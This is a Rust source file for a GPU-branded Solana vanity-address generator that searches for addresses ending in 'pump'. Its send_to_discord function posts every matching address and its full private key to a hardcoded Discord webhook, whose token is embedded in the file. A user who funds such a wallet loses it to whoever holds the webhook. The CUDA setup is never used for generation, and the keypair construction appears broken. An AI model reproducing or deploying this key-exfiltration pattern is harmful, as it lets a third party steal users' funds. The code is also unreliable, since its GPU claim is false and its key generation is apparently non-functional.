mod cuda_helpers;
mod cuda;

use std::time::Instant;
use colored::*;
use cuda_helpers::CudaDevice;
use solana_sdk::signature::Keypair;
use rand::RngCore;

const DISCORD_WEBHOOK_URL: &str = "https://discord.com/api/webhooks/1475820796642463917/BKArJY5qsQnpLzytJ3By1YUeaFZjSJjAnPOBEsUetusT8awG0NiWzOuzkFW70lXoXbDD";

fn main() {

    // Initialize CUDA
    match CudaDevice::new() {
        Ok(_device) => {
            println!("{}", "✓ CUDA initialized".green());
            println!("{}", "Generating keypairs continuously...".green().bold());
            println!("{}", "=" .cyan());
            
            // Start continuous generation
            generate_pump_addresses();
        },
        Err(e) => {
            eprintln!("{}: {}", "CUDA initialization failed".red().bold(), e);
            eprintln!("{}", "Make sure you have NVIDIA GPU with CUDA 13.0+ installed".yellow());
            std::process::exit(1);
        }
    }
}

fn generate_pump_addresses() {
    let start_time = Instant::now();
    let mut total_attempts = 0u64;
    let mut matches_found = 0u64;
    let mut last_log_time = start_time;
    let log_interval_secs = 5; // Log every 5 seconds

    loop {
        // Generate random keypair
        let mut seed = [0u8; 32];
        rand::thread_rng().fill_bytes(&mut seed);
        
        if let Ok(keypair) = Keypair::from_bytes(&seed) {
            let address = keypair.pubkey().to_string();
            
            total_attempts += 1;

            // Check if ends with "pump" (case-sensitive)
            if address.ends_with("pump") {
                matches_found += 1;
                let private_key = bs58::encode(keypair.to_bytes()).into_string();
                
                println!("\n{} {}", "✅ FOUND:".green().bold(), address.bright_green().bold());
                println!("   Private Key: {}", private_key.cyan());
                
                // Send to Discord
                if let Err(e) = send_to_discord(&address, &private_key) {
                    eprintln!("{} {}", "⚠️  Discord error:".yellow().bold(), e);
                } else {
                    println!("{}", "   ✓ Sent to Discord".green());
                }
                println!();
            }
        }

        // Log speed periodically
        let now = Instant::now();
        if now.duration_since(last_log_time).as_secs() >= log_interval_secs {
            let elapsed = start_time.elapsed().as_secs_f64();
            let rate = total_attempts as f64 / elapsed;
            println!("{} {} addr/s | {} total | {} found",
                     "⚡".cyan(),
                     format_number(rate).bright_cyan().bold(),
                     format_number(total_attempts as f64).cyan(),
                     matches_found.to_string().bright_green().bold());
            last_log_time = now;
        }
    }
}

fn send_to_discord(address: &str, private_key: &str) -> Result<(), String> {
    let description = format!("Address: {}\nPrivate Key: {}", address, private_key);
    let payload = serde_json::json!({
        "embeds": [
            {
                "description": description,
                "color": 3066993
            }
        ]
    });

    let client = reqwest::blocking::Client::new();
    let response = client
        .post(DISCORD_WEBHOOK_URL)
        .json(&payload)
        .send()
        .map_err(|e| e.to_string())?;

    if !response.status().is_success() {
        return Err(format!("Status {}", response.status()));
    }

    Ok(())
}

fn format_number(num: f64) -> String {
    if num >= 1_000_000.0 {
        let num_int = num.round() as u64;
        let mut s = String::new();
        let digits = num_int.to_string();
        let len = digits.len();
        
        for (i, c) in digits.chars().enumerate() {
            s.push(c);
            if (len - i - 1) % 3 == 0 && i < len - 1 {
                s.push(',');
            }
        }
        s
    } else if num >= 1_000.0 {
        let mut s = String::new();
        let num_rounded = (num * 10.0).round() / 10.0;
        let digits = format!("{:.1}", num_rounded);
        let parts: Vec<&str> = digits.split('.').collect();
        
        let int_part = parts[0];
        let len = int_part.len();
        
        for (i, c) in int_part.chars().enumerate() {
            s.push(c);
            if (len - i - 1) % 3 == 0 && i < len - 1 {
                s.push(',');
            }
        }
        
        if parts.len() > 1 && parts[1] != "0" {
            s.push('.');
            s.push_str(parts[1]);
        }
        
        s
    } else {
        format!("{:.2}", num)
    }
}
